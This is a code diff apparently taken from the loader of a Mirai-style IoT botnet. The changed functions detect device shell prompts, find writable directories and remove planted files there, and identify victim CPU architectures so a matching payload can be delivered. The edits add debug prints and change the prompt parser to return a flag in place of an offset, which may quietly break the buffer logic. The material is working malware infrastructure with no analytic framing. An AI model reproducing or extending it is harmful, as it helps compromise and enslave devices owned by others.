@@ -214,23 +214,22 @@ int connection_consume_prompt(struct connection *conn)
 {
     char *pch;
     int i, prompt_ending = -1;
-
+    int result = 0;
     for (i = conn->rdbuf_pos; i >= 0; i--)
     {
         if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
         {
 #ifdef DEBUG
             printf("matched any prompt at %d, \"%c\", \"%s\"\n", i, conn->rdbuf[i], conn->rdbuf);
-#endif
-            prompt_ending = i;
+#endif  
+            result = 1;
+            
+            //printf("matched any prompt at %d \n",i);
             break;
-        }
+        }            
     }
-
-    if (prompt_ending == -1)
-        return 0;
-    else
-        return prompt_ending;
+    
+    return result;
 }
 
 int connection_consume_verify_login(struct connection *conn)
@@ -440,10 +439,12 @@ int connection_consume_written_dirs(struct connection *conn)
         util_sockprintf(conn->fd, "rm %s/.t; rm %s/.sh; rm %s/.human\r\n", pch, pch, pch);
         if (!found_writeable)
         {
+            //printf("pch_len:%d\n",pch_len);
             if (pch_len < 31)
             {
                 strcpy(conn->info.writedir, pch);
                 found_writeable = TRUE;
+                //printf ("writedir:%s\n",conn->info.writedir); 
             }
             else
                 connection_close(conn);
@@ -491,7 +492,7 @@ int connection_consume_arch(struct connection *conn)
 #endif
                 break;
         }
-
+        printf("e_machine:%d\n",ehdr->e_machine);
         /* arm mpsl spc m68k ppc x86 mips sh4 */
         if (ehdr->e_machine == EM_ARM || ehdr->e_machine == EM_AARCH64)
             strcpy(conn->info.arch, "arm");
